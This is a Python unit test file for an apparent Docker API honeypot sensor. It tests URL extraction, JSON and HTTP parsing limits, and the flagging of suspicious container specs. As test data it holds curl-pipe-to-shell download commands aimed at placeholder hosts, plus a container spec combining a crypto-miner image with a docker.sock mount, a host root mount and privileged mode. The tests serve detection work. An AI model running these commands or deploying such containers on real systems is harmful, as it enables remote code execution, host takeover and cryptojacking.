"""Unit tests: analysis helpers, parsers, budgets; pathological inputs must stay fast."""

from __future__ import annotations

import json
import time

import pytest

from docker_sensor import analysis
from docker_sensor.api import ContainerRec, DockerApi, split_ref
from docker_sensor.config import Config
from docker_sensor.httpio import HttpError, parse_head
from docker_sensor.profile import build_profile, load_or_create_profile


def fast(fn, limit: float = 0.5):  # type: ignore[no-untyped-def]
    start = time.perf_counter()
    result = fn()
    took = time.perf_counter() - start
    assert took < limit, f"{took:.2f}s"
    return result


def test_find_urls() -> None:
    text = "curl -fsSL http://203.0.113.9:8080/a.sh|sh; wget 'https://198.51.100.1/x?y=1&z=2' -O-"
    assert analysis.find_urls(text) == [
        "http://203.0.113.9:8080/a.sh",
        "https://198.51.100.1/x?y=1&z=2",
    ]
    assert analysis.find_urls("tftp://192.0.2.7/f. and ftp://192.0.2.8/g)") == [
        "tftp://192.0.2.7/f",
        "ftp://192.0.2.8/g",
    ]
    assert analysis.find_urls("http:// nothing") == []


def test_find_urls_is_bounded_and_fast() -> None:
    out = fast(lambda: analysis.find_urls("http://a " * 20000))
    assert len(out) == analysis.MAX_URLS
    out = fast(lambda: analysis.find_urls("http://" + "a" * 70000))
    assert len(out) == 1 and len(out[0]) <= analysis.MAX_URL
    fast(lambda: analysis.find_urls("ht" * 40000))


def test_depth_check() -> None:
    assert analysis.depth_ok(b'{"a":[1,2,{"b":3}]}', 24)
    assert not analysis.depth_ok(b"[" * 100 + b"]" * 100, 24)
    # brackets inside strings do not count
    assert analysis.depth_ok(b'{"a":"' + b"[" * 500 + b'"}', 24)
    assert analysis.depth_ok(b'{"a":"\\"' + b"[" * 500 + b'"}', 24)
    fast(lambda: analysis.depth_ok(b"[" * 262144, 24))
    fast(lambda: analysis.depth_ok(b"[0," * 87000, 24))


def test_bounded_json() -> None:
    assert analysis.bounded_json(b'{"a":1}', max_bytes=100, max_depth=5) == {"a": 1}
    assert analysis.bounded_json(b"{" * 1000, max_bytes=5000, max_depth=5) is None
    assert analysis.bounded_json(b'{"a":1}', max_bytes=3, max_depth=5) is None
    assert analysis.bounded_json(b"\xff\xfe", max_bytes=100, max_depth=5) is None
    assert analysis.bounded_json(b'{"a":' + b"9" * 5000 + b"}", max_bytes=9000, max_depth=5) is None
    fast(lambda: analysis.bounded_json(b"[" * 262144, max_bytes=262144, max_depth=24))
    fast(
        lambda: analysis.bounded_json(b"[" + b"0," * 130000 + b"0]", max_bytes=262144, max_depth=24)
    )
    fast(lambda: analysis.bounded_json(b'{"a":' * 50000, max_bytes=262144, max_depth=24))


def test_container_spec_flags() -> None:
    spec = analysis.parse_container_spec(
        {
            "Image": "ghcr.io/x/xmrig:6",
            "Cmd": "sh -c 'curl http://203.0.113.2/z'",
            "Env": ["POOL=stratum+tcp://pool.example:3333", 7, None],
            "HostConfig": {
                "Binds": ["/var/run/docker.sock:/var/run/docker.sock", "/:/host"],
                "Privileged": True,
                "PidMode": "host",
                "NetworkMode": "host",
                "CapAdd": ["SYS_ADMIN"],
            },
        }
    )
    assert {
        "container_create", "privileged", "host_mount", "docker_sock_mount", "pid_host",
        "net_host", "cap_add", "miner", "image:ghcr.io/x/xmrig:6",
    } <= spec.flags  # fmt: skip
    assert analysis.spec_urls(spec) == ["http://203.0.113.2/z"]


def test_container_spec_robust_to_wrong_types() -> None:
    objs: list[object] = [
        None,
        1,
        "x",
        [],
        {"Image": 5, "Cmd": {"a": 1}, "HostConfig": "x", "Env": 3},
    ]
    for obj in objs:
        spec = analysis.parse_container_spec(obj)
        assert spec.flags == {"container_create"}
    big = {"Image": "a" * 100000, "Cmd": ["x" * 100000] * 1000, "Env": ["y" * 100000] * 1000}
    spec = fast(lambda: analysis.parse_container_spec(big))
    assert len(spec.input) <= 4000 and len(spec.image) <= 256
    assert sum(len(e) for e in spec.env) <= 8192


def test_canned_output_never_runs_anything() -> None:
    assert analysis.canned_output(["id"]).startswith("uid=0(root)")
    assert analysis.canned_output(["sh", "-c", "echo hi"]) == "hi\n"
    assert analysis.canned_output(["sh", "-c", "echo hi; id"]) == ""
    assert analysis.canned_output(["sh", "-c", "curl http://x | sh"]) == ""
    assert analysis.canned_output(["echo", "a" * 5000]) == "a" * 1024 + "\n"


def test_split_ref() -> None:
    assert split_ref("alpine") == ("alpine", "")
    assert split_ref("alpine:3.20") == ("alpine", "3.20")
    assert split_ref("reg.example:5000/a/b") == ("reg.example:5000/a/b", "")
    assert split_ref("reg.example:5000/a/b:v1") == ("reg.example:5000/a/b", "v1")
    assert split_ref("a/b@sha256:abc") == ("a/b", "sha256:abc")


def test_parse_head_rejects_like_go() -> None:
    cfg = Config()
    ok = parse_head(b"GET /_ping HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/8", cfg)
    assert ok.path == "/_ping" and ok.header("user-agent") == "curl/8"
    for bad in (
        b"GET /x HTTP/1.1",  # no Host
        b"GET /x HTTP/2.0\r\nHost: x",
        b"get /x HTTP/1.1\r\nHost: x",
        b"GET x HTTP/1.1\r\nHost: x",
        b"GET /x HTTP/1.1\r\nHost x",
        b"GET /x HTTP/1.1\r\n Host: x",
        b"GET /x /y HTTP/1.1\r\nHost: x",
        b"\x16\x03\x01\x02",
    ):
        with pytest.raises(HttpError):
            parse_head(bad, cfg)
    with pytest.raises(HttpError) as exc:
        parse_head(b"GET /" + b"a" * 9000 + b" HTTP/1.1\r\nHost: x", cfg)
    assert exc.value.status == 414
    many = b"GET / HTTP/1.1\r\nHost: x\r\n" + b"".join(b"X-%d: y\r\n" % i for i in range(100))
    with pytest.raises(HttpError):
        parse_head(many, cfg)


def test_profile_is_stable_and_private(tmp_path) -> None:  # type: ignore[no-untyped-def]
    a = load_or_create_profile(str(tmp_path))
    b = load_or_create_profile(str(tmp_path))
    assert a.daemon_id == b.daemon_id and a.containers == b.containers
    assert oct((tmp_path / "profile.json").stat().st_mode & 0o777) == "0o600"
    blob = json.dumps(
        [a.daemon_id, a.kernel, [c.ip for c in a.containers], [c.name for c in a.containers]]
    )
    for banned in ("192.0.2.", "198.51.100.", "203.0.113.", "honeypot", "suckerpot"):
        assert banned not in blob


def test_state_is_bounded() -> None:
    cfg = Config(state_ips=8, state_per_ip=3)
    api = DockerApi(cfg, build_profile(b"y" * 32, 1_790_000_000.0))
    for i in range(50):
        api.state(f"198.51.100.{i}")
    assert len(api._state) == 8
    st = api.state("203.0.113.9")
    for i in range(10):
        api._remember(
            st.containers,
            str(i),
            ContainerRec(str(i), "n", analysis.ContainerSpec(), 0.0),
            cfg.state_per_ip,
        )
    assert len(st.containers) == 3
